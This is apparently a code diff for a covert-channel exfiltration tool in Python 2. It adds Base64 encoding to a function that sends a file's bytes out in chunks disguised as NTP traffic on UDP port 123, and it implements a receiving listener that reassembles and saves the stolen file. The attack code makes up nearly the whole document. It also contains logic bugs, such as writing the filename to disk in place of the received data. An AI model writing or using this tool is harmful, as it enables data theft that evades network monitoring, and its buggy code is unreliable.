@@ -4,12 +4,14 @@ import os
 import sys
 import time
 import zlib
+import base64
 import struct
 import socket
 from socket import AF_INET, SOCK_DGRAM
 
 # Constants
 READ_BINARY = "rb"
+WRITE_BINARY = "wb"
 NTP_UDP_PORT = 123
 HOST = "pool.ntp.org"
 MAX_BYTES = 46
@@ -47,6 +49,8 @@ def exfiltrate(path_to_file, ntp_server, time_delay=0.1):
 
 	checksum = zlib.crc32(exfil_me)                 # Calculate CRC32 for later verification
 	head, tail = os.path.split(path_to_file)        # Get filename
+
+	exfil_me = base64.b64encode(exfil_me)			# After checksum Base64 encode
 
 	address = (ntp_server, NTP_UDP_PORT)
 	buf = 1024
@@ -86,8 +90,88 @@ def exfiltrate(path_to_file, ntp_server, time_delay=0.1):
 	sys.stdout.write("Done with file %s " % tail)
 
 
-def ntp_listener(ip="0.0.0.0", port=123):
-	# will do this later.
+def ntp_listener(ip="0.0.0.0", port=NTP_UDP_PORT):
+	"""
+	Start an NTP listener
+	:param ip: default is "0.0.0.0"
+	:param port: default is 123
+	:return:
+	"""
+	# Try opening socket and listen
+	try:
+		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+	except socket.error, msg:
+		sys.stderr.write('Failed to create socket. Error Code : ' + str(msg[0]) + ' Message ' + msg[1])
+		raise
+
+	# Try binding to the socket
+	try:
+		s.bind((ip, port))
+	except socket.error, msg:
+		sys.stderr.write('Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1])
+		raise
+
+	# Will keep connection alive as needed
+	while 1:
+		# Todo: DNS server is just a listener. We should allow the option of backwards communication.
+		# Actually receiving data
+		d = s.recvfrom(1024)
+		data = d[0]
+		addr = d[1]
+
+		if data.find(INIT_PACKET) != -1:
+			# Found initiation packet:
+
+			# Extracting header from it
+			data_start_offset = data.find(INIT_BYTE + INIT_PACKET + DELIMITER) + len(INIT_BYTE + INIT_PACKET + DELIMITER)
+			filename = data[data_start_offset:data.find(DELIMITER)]
+			crc32 = data[data.find(DELIMITER)+len(DELIMITER):data.find(PADDER)]
+
+			sys.stdout.write("Initiation file transfer from " + str(addr) + " with file: " + str(filename))
+			actual_file = ""
+			chunks_count = 0
+
+		elif data.find(INIT_BYTE) != -1 and data.find(TERM_PACKET) == -1:
+			# Found data packet:
+			end_of_data_offset = data.find(NULL)
+			start_of_data_offset = data.find(INIT_BYTE) + len(INIT_BYTE)
+
+			actual_file += data[start_of_data_offset:end_of_data_offset]
+			chunks_count += 1
+
+		elif data.find(TERM_PACKET):
+			# Found termination packet:
+
+			try:
+				actual_file = base64.b64decode(actual_file)
+			except:
+				sys.stderr.write("File transfer error. Base64 decoding failed!")
+				return -1
+
+			# Will now compate CRC32s:
+			if crc32 == str(zlib.crc32(actual_file)):
+				sys.stdout.write("CRC32 match! Now saving file")
+				fh = open(str(crc32) + filename, WRITE_BINARY)
+				fh.write(filename)
+				fh.close()
+				replay = "Got it. Thanks :)"
+				s.sendto(replay, addr)
+
+			else:
+				sys.stderr.write("CRC32 not match. Not saving file.")
+				replay = "You fucked up!"
+				s.sendto(replay, addr)
+
+			filename = ""
+			crc32 = ""
+			i = 0
+			addr = ""
+
+		else:
+			sys.stdout.write("Regular packet. Not listing it.")
+
+	s.close()
+	return 0
 	pass
 
 
